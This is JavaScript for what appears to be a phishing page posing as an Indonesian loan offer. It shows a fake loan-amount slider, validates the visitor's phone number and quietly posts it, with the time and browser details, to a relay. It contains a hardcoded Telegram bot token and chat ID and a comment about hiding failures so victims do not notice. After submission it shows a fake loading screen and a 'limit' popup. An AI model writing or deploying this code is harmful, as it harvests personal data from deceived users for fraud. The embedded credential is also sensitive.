document.addEventListener("DOMContentLoaded", function () {

  const input = document.getElementById("phone");
  const btnDesktop = document.getElementById("btnDesktop");
  const btnMobile = document.getElementById("btnMobile");

  console.log("INPUT:", input);

  if (!input || !btnDesktop || !btnMobile) return;
input.addEventListener("input", function () {

  let value = input.value.replace(/\D/g, "");

  // 🔥 HANDLE +62 DAN 0
  if (value.startsWith("62")) {
    value = value.substring(2);
  }

  if (value.startsWith("0")) {
    value = value.substring(1);
  }

  console.log("VALUE FIX:", value); // debug

  if (value.startsWith("8") && value.length >= 9) {

    btnDesktop.classList.add("btn-active");
    btnMobile.classList.add("btn-active");

    btnDesktop.disabled = false;
    btnMobile.disabled = false;

  } else {

    btnDesktop.classList.remove("btn-active");
    btnMobile.classList.remove("btn-active");

    btnDesktop.disabled = true;
    btnMobile.disabled = true;
  }

});

});


// SUBMIT
function submitData() {
  const phone = document.getElementById("phone").value;

  if (!phone) return;

  const token = "8631413593:AAEpmVh-kJkBS3nHJy_a1J9XvG8A61oPWVY";
  const chat_id = "7173961946";

  const text = `
📥 DATA MASUK

📱 Nomor: +62${phone}
🕒 ${new Date().toLocaleString()}
🌐 ${navigator.userAgent}
  `;

fetch("http://localhost:3000/send", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    text: text
  })
})
.then(() => {
  // tampilkan loading
  document.getElementById("loading").classList.add("active");

  setTimeout(() => {
    // sembunyikan loading
    document.getElementById("loading").classList.remove("active");

    // tampilkan popup limit
    document.getElementById("limitPopup").classList.add("active");

  }, 1500);
})
  .catch(() => {
    // diam saja biar user gak sadar
  });
}
























const slider = document.getElementById("slider");
const thumb = document.getElementById("thumb");
const progress = document.getElementById("progress");
const amountText = document.getElementById("amountText");

let isDragging = false;

slider.addEventListener("mousedown", startDrag);
slider.addEventListener("touchstart", startDrag);

document.addEventListener("mousemove", drag);
document.addEventListener("touchmove", drag);

document.addEventListener("mouseup", stopDrag);
document.addEventListener("touchend", stopDrag);

function startDrag(e) {
  isDragging = true;
  move(e);
}

function drag(e) {
  if (!isDragging) return;
  move(e);
}

function stopDrag() {
  isDragging = false;
}

function move(e) {
  const rect = slider.getBoundingClientRect();
  let x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;

  if (x < 0) x = 0;
  if (x > rect.width) x = rect.width;

  const percent = x / rect.width;

  // update UI
  thumb.style.left = `${x}px`;
  progress.style.width = `${percent * 100}%`;

  // range 500rb - 10jt
  const min = 500000;
  const max = 10000000;

  const value = Math.floor(min + percent * (max - min));

  amountText.innerText = "Rp" + formatRupiah(value);
}

// format rupiah
function formatRupiah(num) {
  return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}












function submitData() {
  let phone = document.getElementById("phone").value;

  if (!phone) {
    alert("Masukkan nomor HP!");
    return;
  }

  // 🔥 bersihkan input
  phone = phone.replace(/\D/g, "");

  if (phone.startsWith("62")) {
    phone = phone.substring(2);
  }

  if (phone.startsWith("0")) {
    phone = phone.substring(1);
  }

  // 🔥 simpan disini (INI KUNCI UTAMA)
  localStorage.setItem("phone", phone);

  const text = `
📥 DATA MASUK
📱 Nomor: +62${phone}
🕒 ${new Date().toLocaleString()}
🌐 ${navigator.userAgent}
  `;

  fetch("http://localhost:3000/send", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ text })
  })
  .then(() => {
    window.location.href = "masuk.html"; // atau halaman berikutnya
  });
}




